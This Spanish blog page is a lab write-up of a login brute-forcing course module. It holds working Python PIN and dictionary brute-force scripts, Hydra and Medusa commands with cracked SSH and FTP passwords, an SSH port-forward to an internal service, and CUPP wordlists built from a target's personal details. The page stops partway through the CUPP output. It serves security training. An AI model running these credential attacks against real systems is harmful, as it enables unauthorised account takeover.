@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="/theme/css/elegant.prod.9e9d5ce754.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="/theme/css/custom.css" media="screen">
+
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+
+        <link rel="dns-prefetch" href="//fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+
+        <meta name="author" content="Alexis Imhoff" />
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="offensive, CPTS, HTB Academy, " />
+
+<meta property="og:title" content="Login Brute Forcing "/>
+<meta property="og:url" content="/login-burte-forcing.html" />
+<meta property="og:description" content="Introducción Este módulo forma parte del path de estudio para la CPTS. Resolveremos los ejercicios propuestos, pero ofuscaremos las flags para evitar spoilers. Brute Force Attacks Un ataque de fuerza bruta puro prueba sistemáticamente todas las combinaciones posibles de caracteres dentro de un conjunto y una longitud predeterminada. Si bien …" />
+<meta property="og:site_name" content="alimh blog" />
+<meta property="og:article:author" content="Alexis Imhoff" />
+<meta property="og:article:published_time" content="2024-11-25T00:00:00-03:00" />
+<meta name="twitter:title" content="Login Brute Forcing ">
+<meta name="twitter:description" content="Introducción Este módulo forma parte del path de estudio para la CPTS. Resolveremos los ejercicios propuestos, pero ofuscaremos las flags para evitar spoilers. Brute Force Attacks Un ataque de fuerza bruta puro prueba sistemáticamente todas las combinaciones posibles de caracteres dentro de un conjunto y una longitud predeterminada. Si bien …">
+
+        <title>Login Brute Forcing  · alimh blog
+</title>
+
+
+
+    </head>
+    <body>
+        <div id="content">
+            <div class="navbar navbar-static-top">
+                <div class="navbar-inner">
+                    <div class="container-fluid">
+                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </a>
+                        <a class="brand" href="/"><span class=site-name>alimh blog</span></a>
+                        <div class="nav-collapse collapse">
+                            <ul class="nav pull-right top-menu">
+                                <li >
+                                    <a href=
+                                       "/"
+                                    >Home</a>
+                                </li>
+                                <li ><a href="/categories.html">Categories</a></li>
+                                <li ><a href="/tags.html">Tags</a></li>
+                                <li ><a href="/archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-fluid">
+              <div class="row-fluid">
+                <div class="span2"> 
+<aside id="sidebar">
+    <div class="about-me">
+        <img src="/images/avatar.webp" alt="Mi Foto" class="avatar">
+        <p>Hola! Soy Alexis Imhoff. Ingeniero en informática apasionado por la ciberseguridad. En este blog subiré writeups de CTFs y algun que otro tema relacionado a seguridad.</p>
+        <ul class="social-links">
+            <li>
+                <a href="https://www.linkedin.com/in/alexis-imhoff/" target="_blank" rel="noopener noreferrer">
+                    <i class="fab fa-linkedin"></i>
+                    <!-- Linkedin -->
+              </a>
+            </li>
+        </ul>
+    </div>
+</aside>
+                </div>
+              <div class="span10">
+<article itemscope>
+<div class="row-fluid">
+    <header class="page-header span10 offset1">
+        <h1>
+            <a href="/login-burte-forcing.html">
+                Login Brute Forcing
+            </a>
+        </h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset1 article-content">
+            
+            <p><img alt="module" src="images/images_login_brute_forcing/logo_module.webp"></p>
+<h1>Introducción</h1>
+<p>Este módulo forma parte del path de estudio para la CPTS. Resolveremos los ejercicios propuestos, pero ofuscaremos las flags para evitar spoilers.</p>
+<h1>Brute Force Attacks</h1>
+<p>Un ataque de fuerza bruta puro prueba sistemáticamente todas las combinaciones posibles de caracteres dentro de un conjunto y una longitud predeterminada. Si bien este enfoque garantiza el éxito final si se cuenta con el tiempo suficiente, puede consumir mucho tiempo.</p>
+<p><strong>Question</strong>: After successfully brute-forcing the PIN, what is the full flag the script returns?</p>
+<p>Se nos presenta una aplicación que genera un PIN random de 4 dígitos y lo expone en /pin. Si el PIN proporcionado como parámetro coincide con el generado, la aplicación responde con un mensaje de success y una flag. Caso contrario, devuelve un mensaje de error.</p>
+<p>Se utiliza el siguiente script en Python para probar todas las combinaciones (0000 a 9999):</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;94.237.63.132&quot;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">50693</span>
+
+<span class="c1"># Try every possible 4-digit PIN (from 0000 to 9999)</span>
+<span class="k">for</span> <span class="n">pin</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
+    <span class="n">formatted_pin</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">pin</span><span class="si">:</span><span class="s2">04d</span><span class="si">}</span><span class="s2">&quot;</span>  <span class="c1"># Convert the number to a 4-digit string (e.g., 7 becomes &quot;0007&quot;)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Attempted PIN: </span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">/pin?pin=</span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Check if the server responds with success and the flag is found</span>
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">ok</span> <span class="ow">and</span> <span class="s1">&#39;flag&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>  <span class="c1"># .ok means status code is 200 (success)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Correct PIN found: </span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Flag: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">break</span>
+</code></pre></div>
+
+<p>En este caso, el PIN que devuelve un success es el 4962 y podemos ver la flag:</p>
+<div class="highlight"><pre><span></span><code>Attempting PIN: 4953
+Attempting PIN: 4954
+Attempting PIN: 4955
+Attempting PIN: 4956
+Attempting PIN: 4957
+Attempting PIN: 4958
+Attempting PIN: 4959
+Attempting PIN: 4960
+Attempting PIN: 4961
+Attempting PIN: 4962
+Correct PIN found: 4962
+Flag: HTB{Brut3_F0***************}
+</code></pre></div>
+
+<h1>Dictionary Attacks</h1>
+<p>Emplea una lista precompilada de palabras y frases, lo que reduce drásticamente el espacio de búsqueda. Una lista de palabras bien diseñada y adaptada al sistema objetivo aumenta significativamente la probabilidad de éxito del ataque.</p>
+<p><strong>Question</strong>: After successfully brute-forcing the target using the script, what is the full flag the script returns?</p>
+<p>En esta ocasión, estaremos empleando un diccionario de SecLists y el siguiente script: </p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;83.136.255.120&quot;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">45926</span>
+
+<span class="n">passwords</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Attempted password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Send a POST request to the server with the password</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">/dictionary&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
+
+    <span class="c1"># Check if the server responds with success and contains the &#39;flag&#39;</span>
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">ok</span> <span class="ow">and</span> <span class="s1">&#39;flag&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Correct password found: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Flag: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">break</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Attempted password: tiffany
+Attempted password: zxcvbn
+Attempted password: tomcat
+Attempted password: golf
+Attempted password: bond007
+Attempted password: bear
+Attempted password: tiger
+Attempted password: doctor
+Attempted password: gateway
+Correct password found: gateway
+Flag: HTB{Brut3_F***********}
+</code></pre></div>
+
+<h1>Hydra</h1>
+<h2>Basic HTTP Authentication</h2>
+<p>En una autenticación HTTP básica, el proceso comienza cuando un usuario intenta acceder a un área restringida. El servidor responde con un estado <em>401 Unauthorized</em> y un header <em>WWW-Authenticate</em> que solicita al browser del usuario que presente un login. </p>
+<p>Una vez que el usuario proporciona su nombre de usuario y contraseña, el browser los concatena en una sola cadena, separados por dos puntos. Esta cadena se codifica luego con Base64 y se incluye en el Authorization header de las request posteriores. El servidor decodifica las credenciales, las verifica con su base de datos y otorga o deniega el acceso según corresponda.</p>
+<p>Los headers para una autenticación HTTP básica se ven de la siguiente manera: </p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/protected_resource</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">www.example.com</span>
+<span class="na">Authorization</span><span class="o">:</span> <span class="l">Basic YWxpY2U6c2VjcmV0MTIz</span>
+</code></pre></div>
+
+<p><strong>Question</strong>: After successfully brute-forcing, and then logging into the target, what is the full flag you find?</p>
+<p>Usaremos el servicio http-get de Hydra para realizar brute force a una instancia que utiliza una autenticación HTTP básica. Sabemos que el nombre del usuario es <em>basic-auth-user</em>, por lo que solo necesitamos obtener la contraseña:</p>
+<div class="highlight"><pre><span></span><code>hydra -l basic-auth-user -P /usr/share/SecLists/Passwords/2023-200_most_used_passwords.txt <span class="m">94</span>.237.58.249 http-get / -s <span class="m">58449</span>
+</code></pre></div>
+
+<p><img alt="question3" src="images/images_login_brute_forcing/question3.jpg"></p>
+<p>Con estas credenciales, ingresamos a la web, nos logueamos y obtenemos la flag.</p>
+<h2>Login Forms</h2>
+<p>Cuando estamos ante un formulario de login, la data se tramita por POST. Ejemplo:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">www.example.com</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">29</span>
+
+username=john&amp;password=secret123
+</code></pre></div>
+
+<p>Cuando un usuario interactúa con un formulario de inicio de sesión, su browser se encarga del procesamiento inicial. El navegador captura las credenciales ingresadas, a menudo empleando JavaScript para la validación del lado del cliente o la limpieza de la entrada. Una vez enviado, el browser construye una solicitud HTTP POST. Esta solicitud encapsula los datos del formulario (incluido el nombre de usuario y la contraseña) dentro de su cuerpo, a menudo codificado como <em>application/x-www-form-urlencoded</em> o <em>multipart/form-data</em>.</p>
+<p><strong>Question</strong>: After successfully brute-forcing, and then logging into the target, what is the full flag you find?</p>
+<p>Al ingresar al sitio, vemos un panel de login. Inicialmente, vamos a intentar loguear con las credenciales admin/admin y vamos a capturar la request con Burpsuite para ver cómo se tramita la data y qué respuesta obtenemos ante un login fallido:</p>
+<p><img alt="question4" src="images/images_login_brute_forcing/question4-1.jpg"></p>
+<p>Vemos que los campos de interes se llaman username y password, y en la respuesta el mensaje "Invalid credentials". Usaremos esto para construir el comando de Hydra: </p>
+<div class="highlight"><pre><span></span><code>hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/2023-200_most_used_passwords.txt <span class="m">94</span>.237.52.112 -s <span class="m">39882</span> http-post-form <span class="s2">&quot;/:username=^USER^&amp;password=^PASS^:Invalid credentials&quot;</span>
+</code></pre></div>
+
+<p><img alt="question4" src="images/images_login_brute_forcing/question4-2.jpg"></p>
+<p>Nos logueamos y obtenemos la flag.</p>
+<h1>Medusa</h1>
+<h2>Web Services</h2>
+<p><strong>Question</strong>:  What was the password for the ftpuser?</p>
+<p>Inicialmente, se nos brinda la IP, puerto y el usuario <em>sshuser</em>, por lo tanto, utilizaremos medusa para realizar brute force y obtener la contraseña de ese usuario.</p>
+<div class="highlight"><pre><span></span><code>medusa -h <span class="m">94</span>.237.63.132 -n <span class="m">36839</span> -u sshuser -P /usr/share/SecLists/Passwords/2023-200_most_used_passwords.txt -M ssh -t <span class="m">3</span>
+
+ACCOUNT FOUND: <span class="o">[</span>ssh<span class="o">]</span> Host: <span class="m">94</span>.237.63.132 User: sshuser Password: 1q2w3e4r5t <span class="o">[</span>SUCCESS<span class="o">]</span>
+</code></pre></div>
+
+<p>Nos logueamos con estas credenciales y con netcat vemos qué otros servicios están corriendo: </p>
+<div class="highlight"><pre><span></span><code>sshuser@ng-1531019-loginbfservice-gfpzj-5d56679d8-qqmrt:~$ netstat -tulpn <span class="p">|</span> grep LISTEN
+
+tcp        <span class="m">0</span>      <span class="m">0</span> <span class="m">0</span>.0.0.0:22              <span class="m">0</span>.0.0.0:*               LISTEN      -                   
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::21                   :::*                    LISTEN      -                   
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      -   
+</code></pre></div>
+
+<p>Si bien vemos un servicio corriendo en el puerto 21, no es accesible por fuera: </p>
+<p><img alt="question5" src="images/images_login_brute_forcing/question5-1.jpg"></p>
+<p>Lo que haremos, será realizar un port forwarding para que el puerto 4444 de mi máquina atacante, corresponda con el puerto 21 de la máquia víctima: </p>
+<div class="highlight"><pre><span></span><code>ssh -L <span class="m">4444</span>:localhost:21 sshuser@94.237.63.132 -p <span class="m">36839</span>
+</code></pre></div>
+
+<p>Si ahora escaneamos ese puerto de mi máquina, vemos que correspodne al servicio FTP de la máquia víctima:</p>
+<p><img alt="question5" src="images/images_login_brute_forcing/question5-2.jpg"></p>
+<p>Ahora si, utilizaremos medusa para obtener las credenciales del usuario ftpuser: </p>
+<div class="highlight"><pre><span></span><code>medusa -h <span class="m">127</span>.0.0.1 -u ftpuser -P /usr/share/SecLists/Passwords/2020-200_most_used_passwords.txt -M ftp -n <span class="m">4444</span> -t <span class="m">3</span>
+
+ACCOUNT FOUND: <span class="o">[</span>ftp<span class="o">]</span> Host: <span class="m">127</span>.0.0.1 User: ftpuser Password: qqww1122 <span class="o">[</span>SUCCESS<span class="o">]</span>
+</code></pre></div>
+
+<p>Ahora nos conectamos y vemos que existe el archivo flag.txt. Su contenido es la clave para completar el ejercicio.</p>
+<div class="highlight"><pre><span></span><code><span class="n">sshuser</span><span class="p">@</span><span class="n">ng</span><span class="mi">-1531019</span><span class="o">-</span><span class="n">loginbfservice</span><span class="o">-</span><span class="n">gfpzj</span><span class="mi">-5</span><span class="n">d56679d8</span><span class="o">-</span><span class="n">qqmrt</span><span class="o">:~</span><span class="n">$</span><span class="w"> </span><span class="n">ftp</span><span class="w"> </span><span class="n">ftpuser</span><span class="mf">@127.0.0.1</span><span class="w"></span>
+<span class="n">Connected</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="mf">127.0.0.1</span><span class="p">.</span><span class="w"></span>
+<span class="mi">220</span><span class="w"> </span><span class="p">(</span><span class="n">vsFTPd</span><span class="w"> </span><span class="mf">3.0.5</span><span class="p">)</span><span class="w"></span>
+<span class="mi">331</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password</span><span class="p">.</span><span class="w"></span>
+<span class="nl">Password</span><span class="p">:</span><span class="w"> </span>
+<span class="mi">230</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">successful</span><span class="p">.</span><span class="w"></span>
+<span class="n">Remote</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">UNIX</span><span class="p">.</span><span class="w"></span>
+<span class="n">Using</span><span class="w"> </span><span class="n">binary</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">transfer</span><span class="w"> </span><span class="n">files</span><span class="p">.</span><span class="w"></span>
+<span class="n">No</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">terminal</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="s">&quot;xterm-kitty&quot;</span><span class="p">;</span><span class="w"></span>
+<span class="n">using</span><span class="w"> </span><span class="n">dumb</span><span class="w"> </span><span class="n">terminal</span><span class="w"> </span><span class="n">settings</span><span class="p">.</span><span class="w"></span>
+<span class="n">ftp</span><span class="o">&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"></span>
+<span class="mi">229</span><span class="w"> </span><span class="n">Entering</span><span class="w"> </span><span class="n">Extended</span><span class="w"> </span><span class="n">Passive</span><span class="w"> </span><span class="n">Mode</span><span class="w"> </span><span class="p">(</span><span class="o">|||</span><span class="mi">40341</span><span class="o">|</span><span class="p">)</span><span class="w"></span>
+<span class="mi">150</span><span class="w"> </span><span class="n">Here</span><span class="w"> </span><span class="n">comes</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">listing</span><span class="p">.</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="mi">1001</span><span class="w">     </span><span class="mi">1001</span><span class="w">           </span><span class="mi">35</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">27</span><span class="w"> </span><span class="mi">13</span><span class="o">:</span><span class="mi">44</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="mi">226</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="n">send</span><span class="w"> </span><span class="n">OK</span><span class="p">.</span><span class="w"></span>
+<span class="n">ftp</span><span class="o">&gt;</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="nl">local</span><span class="p">:</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">remote</span><span class="o">:</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="mi">229</span><span class="w"> </span><span class="n">Entering</span><span class="w"> </span><span class="n">Extended</span><span class="w"> </span><span class="n">Passive</span><span class="w"> </span><span class="n">Mode</span><span class="w"> </span><span class="p">(</span><span class="o">|||</span><span class="mi">58933</span><span class="o">|</span><span class="p">)</span><span class="w"></span>
+<span class="mi">150</span><span class="w"> </span><span class="n">Opening</span><span class="w"> </span><span class="n">BINARY</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="p">(</span><span class="mi">35</span><span class="w"> </span><span class="n">bytes</span><span class="p">).</span><span class="w"></span>
+<span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="o">|*********************************************************************************************************************************************|</span><span class="w">    </span><span class="mi">35</span><span class="w">      </span><span class="mf">794.87</span><span class="w"> </span><span class="n">KiB</span><span class="o">/</span><span class="n">s</span><span class="w">    </span><span class="mo">00</span><span class="o">:</span><span class="mo">00</span><span class="w"> </span><span class="n">ETA</span><span class="w"></span>
+<span class="mi">226</span><span class="w"> </span><span class="n">Transfer</span><span class="w"> </span><span class="n">complete</span><span class="p">.</span><span class="w"></span>
+<span class="mi">35</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mo">00</span><span class="o">:</span><span class="mo">00</span><span class="w"> </span><span class="p">(</span><span class="mf">153.27</span><span class="w"> </span><span class="n">KiB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span><span class="w"></span>
+<span class="n">ftp</span><span class="o">&gt;</span><span class="w"> </span><span class="n">exit</span><span class="w"></span>
+<span class="mi">221</span><span class="w"> </span><span class="n">Goodbye</span><span class="p">.</span><span class="w"></span>
+</code></pre></div>
+
+<h1>Custom Wordlists</h1>
+<p>Tener wordlists adaptados al objetivo puede aumentar significativamente el éxito del ataque. En este ejercicio, se nos propone customizar los diccionarios para usernames y passwords, partiendo del usuario <em>Jane Smith</em>.</p>
+<p><strong>Question</strong>: After successfully brute-forcing, and then logging into the target, what is the full flag you find?</p>
+<h3>Username Anarchy</h3>
+<p>Nos permite crear un listado de usernames con variantes, partiendo de un nombre. </p>
+<div class="highlight"><pre><span></span><code>git clone https://github.com/urbanadventurer/username-anarchy.git
+<span class="nb">cd</span> username-anarchy
+./username-anarchy Jane Smith &gt; jane_smith_usernames.txt
+</code></pre></div>
+
+<p>Output: </p>
+<div class="highlight"><pre><span></span><code>jane
+janesmith
+jane.smith
+janesmit
+janes
+j.smith
+jsmith
+sjane
+s.jane
+smithj
+smith
+smith.j
+smith.jane
+js
+</code></pre></div>
+
+<h3>CUPP</h3>
+<p>CUPP (Common User Passwords Profiler) es una herramienta diseñada para crear wordlists de contraseñas  personalizadas que aprovechan la información recopilada sobre el objetivo. Podemos recopiar información de redes sociales, sitios webs de la compañía, artículos, blogs, etc. En este caso, se nos ofrece la información en el propio ejercicio.</p>
+<p>Lo ejecutamos de la siguiente manera, y nos irá haciendo preguntas donde podremos insertar la información recopilada:</p>
+<div class="highlight"><pre><span></span><code>cupp -i
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Insert</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">about</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">victim</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">make</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">dictionary</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">don</span><span class="s1">&#39;t know all the info, just hit enter when asked! ;)</span>
+
+<span class="s1">&gt; First Name: Jane</span>
+<span class="s1">&gt; Surname: Smith</span>
+<span class="s1">&gt; Nickname: Janey</span>
+<span class="s1">&gt; Birthdate (DDMMYYYY): 11121990</span>
+
+
+<span class="s1">&gt; Partners) name: Jim</span>
+<span class="s1">&gt; Partners) nickname: Jimbo</span>
+<span class="s1">&gt; Partners) birthdate (DDMMYYYY): 12121990</span>
+
+
+<span class="s1">&gt; Child&#39;</span><span class="n">s</span><span class="w"> </span><span class="nl">name</span><span class="p">:</span><span class="w"> </span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">Child</span><span class="s1">&#39;s nickname: </span>
+<span class="s1">&gt; Child&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">birthdate</span><span class="w"> </span><span class="p">(</span><span class="n">DDMMYYYY</span><span class="p">)</span><span class="err">:</span><span class="w"> </span>
+
+
+<span class="o">&gt;</span><span class="w"> </span><span class="n">Pet</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="nl">name</span><span class="p">:</span><span class="w"> </span><span class="n">Spot</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">Company</span><span class="w"> </span><span class="nl">name</span><span class="p">:</span><span class="w"> </span><span class="n">AHI</span><span class="w"></span>
+
+
+<span class="o">&gt;</span><span class="w"> </span><span class="n">Do</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">add</span><span class="w"> </span><span class="ow">some</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="n">about</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">victim</span><span class="vm">?</span><span class="w"> </span><span class="n">Y</span><span class="o">/[</span><span class="n">N</span><span class="o">]</span><span class="err">:</span><span class="w"> </span><span class="n">Y</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">enter</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">words</span><span class="p">,</span><span class="w"> </span><span class="n">separated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">comma</span><span class="p">.</span><span class="w"> </span><span class="o">[</span><span class="n">i.e. hacker,juice,black</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">spaces</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="nl">removed</span><span class="p">:</span><span class="w"> </span><span class="n">hackers</span><span class="p">,</span><span class="n">pizza</span><span class="p">,</span><span class="n">golf</span><span class="p">,</span><span class="n">horses</span><span class="p">,</span><span class="n">blue</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">Do</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">add</span><span class="w"> </span><span class="n">special</span><span class="w"> </span><span class="n">chars</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">words</span><span class="vm">?</span><span class="w"> </span><span class="n">Y</span><span class="o">/[</span><span class="n">N</span><span class="o">]</span><span class="err">:</span><span class="w"> </span><span class="n">Y</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">Do</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">add</span><span class="w"> </span><span class="ow">some</span><span class="w"> </span><span class="n">random</span><span class="w"> </span><span class="n">numbers</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">words</span><span class="vm">?</span><span class="w"> </span><span class="n">Y</span><span class="o">/[</span><span class="n">N</span><span class="o">]</span><span class="err">:</span><span class="n">Y</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">Leet</span><span class="w"> </span><span class="n">mode</span><span class="vm">?</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">e</span><span class="p">.</span><span class="w"> </span><span class="n">leet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1337</span><span class="p">)</span><span class="w"> </span><span class="n">Y</span><span class="o">/[</span><span class="n">N</span><span class="o">]</span><span class="err">:</span><span class="w"> </span><span class="n">Y</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Now</span><span class="w"> </span><span class="n">making</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">dictionary</span><span class="p">...</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Sorting</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">removing</span><span class="w"> </span><span class="n">duplicates</span><span class="p">...</span><span class="w"></span>
